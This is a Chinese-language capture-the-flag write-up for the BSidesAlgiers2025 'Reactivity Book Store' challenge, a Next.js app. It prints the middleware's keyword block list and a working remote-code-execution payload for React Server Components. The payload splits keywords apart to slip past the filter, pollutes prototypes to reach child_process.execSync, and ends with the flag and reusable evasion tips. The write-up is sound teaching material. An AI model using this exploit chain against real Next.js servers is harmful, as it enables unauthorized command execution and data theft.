# BSidesAlgiers2025 - Reactivity Book Store

## 题目简述

该题是 Next.js 应用，题面关键词“Reactivity”指向 SSR / Server Action 路由。关键决策点是：
`addToFavorites` 是 server action 入口，`middleware` 对 POST 请求做关键字拦截，`next.config.js` 仅开放了 `allowedOrigins`。

关键点是 `POST` 请求先经过过滤，再交给 Next 的 Server Action 处理。官方提示明确将其对齐为 [CVE-2025-55182（React Server Components 链路漏洞）](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components) 下的 payload 构造问题。该公告中给出的关键前提是：当对象属性访问链可被注入到服务器动作解析路径时，黑盒黑名单并不等同于可信执行边界，属于“可控表达式/对象链注入”型问题。

决定性障碍是：**在关键词过滤存在的情况下，在 RSC `Next-Action` 负载内构造可执行表达式，触发 `execSync` 远程命令执行**。

## 解题过程

### 关键观察

中间件实现：

```typescript
const blockedKeywords = [
  "require", "process", "child_process", "exec", "spawn", "fs", "module", "eval", "Bun", "import"
];

for (const keyword of blockedKeywords) {
    if (rawBody.includes(keyword)) {
        return new NextResponse(JSON.stringify({
            error: "Malicious activity detected.",
            message: "Our AI security system has blocked your request."
        }), { status: 403, headers: { 'Content-Type': 'application/json' } });
    }
}
```

`actions.ts` 的动作本身不含权限保护，核心是 `addToFavorites` 返回固定 JSON，不会拒绝异常输入。

官方 `solution/README.md` 也给出了尝试先跑 `id` 再换为文件读取命令的标准姿势，说明思路是先验证执行链路，再做 flag 命令。

`page.tsx` 通过 `<form action={() => handleAddClick(...)}>` 调用该 action，说明动作流是可由请求载荷触发的。官方 `solve.py` 采用“分段拼接敏感关键字”的策略绕过了静态包含检测。

官方 payload 主要构造如下：

```python
bypass_payload = (
    "var p_str = 'pro' + 'cess';"
    "var p = globalThis[p_str];"
    "var r_str = 'req' + 'uire';"
    "var mm = p.mainModule;"
    "var req = mm[r_str];"
    "var cp_str = 'chi' + 'ld_pro'+'cess';"
    "var cp = req(cp_str);"
    "var e_str = 'ex' + 'ecSync';"
    f"var res = cp[e_str]('{COMMAND}').toString();"

    f"throw Object.assign(new Error('FLAG_OUTPUT'), {{digest: res}});"
)
```

同时构造 multipart `Next-Action` 负载与 `Next-Action: x` 头发送请求。

### 求解步骤（可复现）

1. 构造 `Next-Action` 请求体（`files` 字段）和上述分片字符串，避免被中间件命中的完整关键字。
2. `command` 可先用 `id` 做可执行性确认，再换成 `cat /app/.../flag` 或实际路径下命令。
3. 观察返回体中通过 `digest` 抛出的命令输出，提取 flag。

官方脚本骨架（核心字段）：

```python
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": bypass_payload,
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
```

### 验证

官方 `solution/README.md` 与 `solution/solve.py` 给出的最终校验输出为：

`shellmates{$oMe_weB_VUlN3rab1L1tIE$_c4n_caUse_cH44aOS}`

## 方法总结

- 核心技巧：将黑名单过滤定义为“字符串包含”时，利用构造拼接（如 `'pro' + 'cess'`）与 RSC action 反序列化链条触发隐式表达式执行。
- 识别信号：`Next-Action` 请求头 + `serverActions` + 关键词过滤的 Next/React 应用，优先考虑 React Server Action 序列化/反序列化链路。
- 复用要点：payload 中不要直接暴露被拦截关键字；把敏感 token 分段拼接，并让异常或返回对象携带命令结果，便于无交互通道回传。
